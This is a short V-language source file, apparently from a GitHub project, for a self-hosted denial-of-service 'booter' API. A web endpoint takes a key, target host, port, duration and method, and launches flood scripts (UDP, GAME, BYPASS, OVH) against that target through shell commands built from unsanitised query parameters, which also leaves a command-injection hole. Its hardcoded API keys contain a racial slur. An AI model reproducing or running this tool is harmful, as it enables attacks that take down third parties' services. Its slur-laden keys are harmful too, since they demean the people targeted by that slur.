/*
	DOS API Script to host locally

@title: dos api
@since: 4/20/22
@author: Erupt
@github: https://github.com/Eruptsy

This file can be used by itself. The whole API is coded in here as of right now but will be advanced later
*/

import os
import vweb

pub struct App {
	vweb.Context
	pub mut:
		api_keys		[]string 			= ['my_nigger_key', // MAIN KEY YOU CAN DO ADMIN SHIT WITH
												'niggered'
												]
									
		methods 		map[string]string 	= { 'UDP': 'screen -dm python h.py ',
												'GAME': 'screen -dm ./game ',
												'BYPASS': 'screen -dm ./bypass '
												'OVH': 'screen -dm ./ovh '
												}
}

fn main() {
	vweb.run(&App{}, 80)
}

pub fn (mut app App) index() vweb.Result {
	return $vweb.html()
}

pub fn (mut app App) api() vweb.Result {
	key			:= app.query['key']
	host 		:= app.query['host']
	port 		:= app.query['port']
	time 		:= app.query['time']
	method 		:= app.query['method']
	

	if key == "" || host == "" || port == "" || time == "" || method == "" {
		app.text("[x] Error, Fill all GET parameters to continue!")
		return $vweb.html()
	}

	if key in app.api_keys {
		println(app.methods[method] or {
			app.text("[x] Error, Invalid method!")
			return $vweb.html()
		})

	
		full_cmd := app.methods[method] + "${host} ${port} ${time}"
		os.execute(full_cmd)
		app.text("[+] Attack sent to ${host}:${port} for ${time} seconds with ${method}..!")
		return $vweb.html()
	} else { 
		app.text("[x] Error, Invalid key!")
		return $vweb.html()
	}
		

	return $vweb.html()
}
